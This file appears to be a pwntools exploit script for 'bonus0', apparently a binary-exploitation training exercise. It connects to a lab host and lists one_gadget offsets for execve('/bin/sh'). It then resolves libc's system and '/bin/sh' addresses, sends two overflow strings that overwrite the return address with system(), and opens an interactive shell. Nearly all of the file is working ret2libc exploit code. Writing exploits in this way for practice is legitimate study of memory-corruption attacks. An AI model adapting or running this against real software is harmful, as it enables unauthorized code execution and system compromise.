#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ../../../bonus0 --host 172.28.240.1 --port 4000
from pwn import *

from binascii import hexlify

# Set up pwntools for the correct architecture
exe = context.binary = ELF('../../../bonus0')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '172.20.80.1'
port = int(args.PORT or 4000)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(["edb", "--run", exe.path], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments


#0x3eefc execve("/bin/sh", esp+0x148, environ)
#constraints:
#  ebx is the GOT address of libc
#  [esp+0x148] == NULL

#0x6669e execl("/bin/sh", "sh", [esp+0x8])
#constraints:
#  ebx is the GOT address of libc
#  [esp+0x8] == NULL

#0x666a4 execl("/bin/sh", eax)
#constraints:
#  ebx is the GOT address of libc
#  eax == NULL

#0x666a8 execl("/bin/sh", [esp+0x4])
#constraints:
#  ebx is the GOT address of libc
#  [esp+0x4] == NULL

io = start()

if args.QIRA:
    LIBC_BASE = 0xf65c5000
    libc = ELF("../../../libc-2.32.so")
elif args.EDB:
    LIBC_BASE = 0xf7dc9000
    libc = ELF("../../../libc-2.32.so")
elif args.LOCAL:
    LIBC_BASE = 0xf7dc9000
    libc = ELF("../../../libc-2.32-local.so")
else:
    LIBC_BASE = 0xb7e2c000
    libc = ELF("../../../libc-2.32.so")

libc.address = LIBC_BASE
ONE_GADGET = p32(0x666a4 + libc.address)
SYSTEM = p32(libc.sym["system"])
BIN_SH = p32(next(libc.search(b'/bin/sh')))

print(hexlify(SYSTEM))

pause()

str1 = b"aaaaaaaaaaaaaaaaaaaa"
io.sendline(str1)

pause()
str2 = b"aaaaaaaaaaaaa" + SYSTEM + b"aaa"
io.sendline(str2)

io.interactive()

